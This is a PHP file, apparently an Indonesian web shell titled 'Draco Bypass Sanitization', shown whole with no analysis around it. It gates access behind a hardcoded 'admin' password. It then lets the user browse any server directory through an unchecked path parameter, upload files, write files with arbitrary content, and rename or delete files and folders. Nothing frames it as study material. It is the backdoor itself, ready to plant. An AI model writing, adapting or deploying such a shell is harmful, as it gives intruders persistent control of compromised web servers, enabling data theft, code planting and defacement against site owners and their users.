<?php
session_start();
$pass = "admin"; // Ganti dengan password di inginkan!!!!!!

if (!isset($_SESSION['login'])) {
    if (isset($_POST['password']) && $_POST['password'] === $pass) {
        $_SESSION['login'] = true;
    } else {
        echo '<form method="post"><input type="password" name="password"/><input type="submit" value="Login"/></form>';
        exit;
    }
}

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

$items = scandir($current_dir);
$folders = [];
$files = [];

foreach ($items as $item) {
    if ($item !== "." && $item !== "..") {
        $item_path = $current_dir . "/" . $item;
        if (is_dir($item_path)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
}

sort($folders);
sort($files);

if (isset($_POST['mkdir'])) {
    mkdir($current_dir . "/" . $_POST['mkdir']);
}

if (isset($_POST['newfile']) && isset($_POST['content'])) {
    file_put_contents($current_dir . "/" . $_POST['newfile'], $_POST['content']);
}

$upload_status = "";
if (isset($_FILES['file'])) {
    // Tentukan direktori tujuan upload
    $target_dir = $current_dir . "/";
    $target_file = $target_dir . basename($_FILES['file']['name']);

    // Periksa apakah file berhasil di-upload
    if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
        $upload_status = "❌ Gagal mengupload file. Error: " . $_FILES['file']['error'];
    } else {
        // Proses upload
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            $upload_status = "✅ File berhasil diupload: " . htmlspecialchars($_FILES['file']['name']);
        } else {
            $upload_status = "❌ Gagal mengupload file. Cek izin folder.";
        }
    }
}


if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    rename($current_dir . "/" . $_POST['rename_from'], $current_dir . "/" . $_POST['rename_to']);
}

if (isset($_GET['delete'])) {
    $target = $current_dir . "/" . $_GET['delete'];
    is_dir($target) ? rmdir($target) : unlink($target);
}

echo "<!DOCTYPE html>
<html lang='id'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Draco Bypass Sanitization " . htmlspecialchars($current_dir) . "</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; }
        table { width: 80%; margin: 20px auto; border-collapse: collapse; }
        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
        th { background-color: #f4f4f4; }
        .actions { display: flex; justify-content: center; gap: 10px; }
        .actions form { display: inline-block; }
        input, textarea { width: 100%; padding: 5px; margin: 5px 0; }
        input[type='submit'] { cursor: pointer; }
        .container { width: 60%; margin: auto; }
    </style>
</head>
<body>";

echo "<style>
    body { font-family: Arial, sans-serif; text-align: center; }
    table { width: 80%; margin: 20px auto; border-collapse: collapse; }
    th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
    th { background-color: #f4f4f4; }
    .actions { display: flex; justify-content: center; gap: 10px; }
    .actions form { display: inline-block; }
    input, textarea { width: 100%; padding: 5px; margin: 5px 0; }
    input[type='submit'] { cursor: pointer; }
    .container { width: 60%; margin: auto; }
</style>";

echo "<div class='container'>";
echo "<h2><center>Draco Bypass Sanitization<center></h2>";
echo "<h3>Path: " . htmlspecialchars($current_dir) . "</h3>";
echo "<a href='?dir=" . urlencode(dirname($current_dir)) . "'>🔙 Kembali ke Atas</a><br><br>";

echo "<form method='post'>
        <input type='text' name='mkdir' placeholder='Folder Name'/>
        <input type='submit' value='Create Folder'/>
      </form>";

echo "<form method='post'>
        <input type='text' name='newfile' placeholder='File Name'/>
        <textarea name='content' placeholder='File Content'></textarea>
        <input type='submit' value='Create File'/>
      </form>";

echo "<form method='post' enctype='multipart/form-data'>
        <input type='file' name='file'/>
        <input type='submit' value='Upload'/>
      </form>";

echo "<p><b>$upload_status</b></p>";


echo "<table>";
echo "<tr><th>Nama</th><th>Tipe</th><th>Aksi</th></tr>";


foreach ($folders as $folder) {
    $folder_path = $current_dir . "/" . $folder;
    echo "<tr>";
    echo "<td>📁 <b>" . htmlspecialchars($folder) . "</b></td>";
    echo "<td>Folder</td>";
    echo "<td class='actions'>";
    echo "<a href='?dir=" . urlencode($folder_path) . "'>📂 Buka</a>";
    echo "<a href='?dir=" . urlencode($current_dir) . "&delete=" . urlencode($folder) . "' onclick='return confirm(\"Yakin hapus folder?\")'>🗑️ Hapus</a>";
    echo "<form method='post' style='display:inline;'><input type='hidden' name='rename_from' value='" . htmlspecialchars($folder) . "'>";
    echo "<input type='text' name='rename_to' placeholder='Nama Baru' required>";
    echo "<input type='submit' value='🔄 Rename'></form>";
    echo "</td>";
    echo "</tr>";
}
foreach ($files as $file) {
    $file_path = $current_dir . "/" . $file;
    echo "<tr>";
    echo "<td>📄 " . htmlspecialchars($file) . "</td>";
    echo "<td>File</td>";
    echo "<td class='actions'>";
    echo "<a href='" . htmlspecialchars($file_path) . "' target='_blank'>📥 Download</a>";
    echo "<a href='?dir=" . urlencode($current_dir) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Yakin hapus file?\")'>🗑️ Hapus</a>";
    echo "<form method='post' style='display:inline;'><input type='hidden' name='rename_from' value='" . htmlspecialchars($file) . "'>";
    echo "<input type='text' name='rename_to' placeholder='Nama Baru' required>";
    echo "<input type='submit' value='🔄 Rename'></form>";
    echo "</td>";
    echo "</tr>";
}

echo "</table>";
echo "</div>";
?>
